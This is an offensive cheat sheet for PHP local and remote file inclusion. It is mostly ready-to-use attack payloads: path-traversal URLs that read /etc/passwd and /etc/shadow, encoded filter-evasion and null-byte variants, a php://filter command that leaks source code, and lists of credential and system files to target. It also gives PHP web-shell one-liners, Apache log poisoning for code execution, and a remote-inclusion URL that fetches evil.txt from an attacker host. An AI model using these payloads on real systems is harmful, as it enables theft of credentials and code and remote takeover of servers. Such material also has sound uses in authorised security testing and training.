# LFI

### For local file inclusions look for `include()` function in PHP code
```
include("lang/".$_COOKIE['lang']); 
include($_GET['page'].".php");
```

### LFI - Encode and Decode a file using base64
```
curl -s \
"http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
| grep -e '\[^\\ \]\\{40,\\}' | base64 -d
```

### Downloading a file with base64 encoding (using PHP filter)
```
http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

### LFI files on different systems 

#### Linux
- /etc/issue
- /proc/version
- /etc/profile
- /etc/passwd
- /etc/shadow
- /root/.bash_history
- /var/log/dmessage
- /var/mail/root
- /var/spool/cron/crontabs/root

#### Windows
- %SYSTEMROOT%\repair\system
- %SYSTEMROOT%\repair\SAM
- %WINDIR%\win.ini
- %SYSTEMDRIVE%\boot.ini
- %WINDIR%\Panther\sysprep.inf
- %WINDIR%\system32\config\AppEvent.Evt


### LFI to download password files 
- http://$ip/index.php?file=/etc/passwd
- http://$ip/index.php?file=../../../../../../../etc/passwd

### LFI to download password files with filter evasion 
- http://$ip/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd

### In PHP < 5.3
```
GET /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../../windows/system32/drivers/etc/hosts%00
```

### Contaminating log files 
```
<?php echo shell_exec($_GET['cmd']);?>
```


# RFI 

### For remote file inclusion, look for php code that is not sanitized and passed to the PHP include function and the php.ini file must be configured to allow remote files

```
/etc/php5/cgi/php.ini - "allow_url_fopen" and "allow_url_include" both set to "on"
include($_REQUEST['file'].".php");
```

### Remote File Inclusion
```
http://$ip/addguestbook.php?name=a&comment=b&LANG=http://<attacking-ip>/evil.txt
<?php echo shell\_exec("ipconfig");?>
```

#### Using LFI to poison apache2 log file for RCE
```
# add <?php system($_GET["cmd"]); ?> to User-Agent header
# now access http://$ip/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id
```

